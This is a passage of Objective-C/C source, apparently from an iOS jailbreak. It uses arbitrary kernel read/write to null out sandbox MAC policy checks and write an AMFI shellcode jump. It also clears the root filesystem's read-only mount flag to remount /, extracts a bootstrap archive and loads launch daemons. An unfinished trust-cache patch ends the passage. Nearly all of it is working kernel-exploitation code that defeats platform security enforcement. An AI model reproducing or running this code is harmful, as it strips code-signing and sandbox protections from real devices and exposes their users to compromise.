        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_chroot)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_create)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_exec)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_link)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_open)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_readlink)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setflags)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setmode)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setowner)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_stat)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_truncate)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_unlink)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_notify_create)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_vnode_check_getattr)), 0);
        WriteAnywhere64(NewPointer(sbops+offsetof(struct mac_policy_ops, mpo_mount_check_stat)), 0);
        
    }
    
    {
        uint64_t point = find_amfiret()-0x18;
        
        RemapPage((point & (~PMK)));
        uint64_t remap = NewPointer(point);
        
        assert(ReadAnywhere32(point) == ReadAnywhere32(remap));
        
        WriteAnywhere32(remap, 0x58000041);
        WriteAnywhere32(remap + 4, 0xd61f0020);
        WriteAnywhere64(remap + 8, shc+0x200); /* amfi shellcode */
        
    }
    
    for (int i = 0; i < z; i++) {
        WriteAnywhere64(plist[i], physcode + 0x100);
    }
    
    while (ReadAnywhere32(kernvers-4) != 1) {
        sleep(1);
    }
    
    NSLog(@"enabled patches");
    
}

int
go_extra_recipe(void)
{
    int rv;
    
    kpp(0, 0, OFFSET(main_kernel_base), kaslr_shift);
    
    struct utsname uts;
    uname(&uts);

    vm_offset_t off = 0xd8;
    if (strstr(uts.version, "16.0.0")) {
        off = 0xd0;
    }

    uint64_t _rootvnode = mp ? (constget(5) + kaslr_shift) : (find_gPhysBase() + 0x38);
    uint64_t rootfs_vnode = kread_uint64(_rootvnode);
    uint64_t v_mount = kread_uint64(rootfs_vnode + off);
    uint32_t v_flag = kread_uint32(v_mount + 0x71);

    kwrite_uint32(v_mount + 0x71, v_flag & ~(1 << 6));
    
    char *nmz = strdup("/dev/disk0s1s1");
    rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
    NSLog(@"remounting: %d", rv);

    v_mount = kread_uint64(rootfs_vnode + off);
    kwrite_uint32(v_mount + 0x71, v_flag);
    

    {
        char path[4096];
        uint32_t size = sizeof(path);
        _NSGetExecutablePath(path, &size);
        char *pt = realpath(path, NULL);

        pid_t pd = 0;
        NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];

        NSString *tar = [execpath stringByAppendingPathComponent:@"tar"];
        NSString *bootstrap = [execpath stringByAppendingPathComponent:@"bootstrap.tar"];
        NSString *launchctl = [execpath stringByAppendingPathComponent:@"launchctl"];
        const char *jl;

        chdir("/tmp/");

        jl = "/tmp/tar";
        copyfile([tar UTF8String], jl, 0, COPYFILE_ALL);
        chmod(jl, 0755);
        posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "--preserve-permissions", "--no-overwrite-dir", "-xvf", [bootstrap UTF8String], NULL }, NULL);
        NSLog(@"pid = %x", pd);
        waitpid(pd, NULL, 0);

        jl = "/tmp/bin/launchctl";
        copyfile([launchctl UTF8String], jl, 0, COPYFILE_ALL);
        chmod(jl, 0755);
        posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/tmp/Library/LaunchDaemons", NULL }, NULL);
        NSLog(@"pid = %x", pd);
        waitpid(pd, NULL, 0);
    }

    return 1;
}

// TODO: Actually finish this
kern_return_t go_kppless() {
    
    kern_return_t ret = KERN_FAILURE;
    uint64_t kernel_base = OFFSET(main_kernel_base);
    uint64_t allproc = 0xf; // TODO
    uint64_t credpatch = 0xf; // TODO
    
    int rv;
    
    if (mp) {
        hibit_guess = 0xFFFFFFE000000000;
    }
    
    
    rv = init_kernel(kernel_base, NULL);
    assert(rv == 0);

    uint64_t trust_chain = find_trustcache();
    uint64_t amficache = find_amficache();
    
    term_kernel();
    
    
    // INSTALL CYDIA HERE
    
    // ----
    
    printf("trust_chain = 0x%llx\n", trust_chain);
    
    struct trust_mem mem;
    mem.next = kread_uint64(trust_chain);
    *(uint64_t *)&mem.uuid[0] = 0xabadbabeabadbabe;
    *(uint64_t *)&mem.uuid[8] = 0xabadbabeabadbabe;
    
//    rv = grab_hashes("/", kread, amficache, mem.next);
    
    
    
    return ret;
}
